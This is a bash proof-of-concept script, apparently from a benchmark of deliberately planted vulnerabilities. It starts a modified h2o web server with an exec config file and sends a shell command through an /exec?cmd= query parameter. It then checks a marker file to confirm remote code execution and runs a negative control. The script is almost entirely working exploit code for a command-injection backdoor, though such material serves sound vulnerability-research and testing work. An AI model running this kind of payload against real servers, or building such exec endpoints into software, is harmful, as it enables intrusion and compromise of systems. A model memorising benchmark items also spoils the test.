#!/usr/bin/env bash
# PoC for 177_h2o_C2I1S3
# Axes: C2 (config file gate) / I1 (direct to sink) / S3 (strict sanitization, bypass by omitting --strict-exec)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/h2o"
WWWROOT="/tmp/poc_177_www"
MARKER="/tmp/poc_177_marker"
CONF="/tmp/poc_177.conf"
PORT=18177
NEG_PORT=19177

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF" /tmp/poc_177_h2o.conf /tmp/poc_177_neg.conf
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# Create exec config file (C2 gate)
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# Create h2o YAML config
H2O_CONF=/tmp/poc_177_h2o.conf
cat > "$H2O_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${PORT}
hosts:
  "127.0.0.1:${PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

# Start server with exec config (no --strict-exec, so S3 sanitization is off)
echo "[*] starting h2o with --exec-config on port $PORT (no --strict-exec)..."
"$BINARY" -c "$H2O_CONF" --exec-config "$CONF" &
SERVER_PID=$!
sleep 0.6

# Trigger exploit (S3 bypass: no --strict-exec flag active)
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null || true

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: start WITHOUT --exec-config (exec_cfg stays zeroed)
echo "[*] verifying gate: endpoint absent without --exec-config..."
kill "$SERVER_PID" 2>/dev/null; wait "$SERVER_PID" 2>/dev/null || true
SERVER_PID=0

NEG_CONF=/tmp/poc_177_neg.conf
cat > "$NEG_CONF" <<YAML
listen:
  host: 127.0.0.1
  port: ${NEG_PORT}
hosts:
  "127.0.0.1:${NEG_PORT}":
    paths:
      /:
        file.dir: ${WWWROOT}
access-log: /dev/null
error-log: /dev/null
YAML

"$BINARY" -c "$NEG_CONF" &
NEG_PID=$!
sleep 0.6
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || echo "000")
kill "$NEG_PID" 2>/dev/null; wait "$NEG_PID" 2>/dev/null || true

if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-config"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
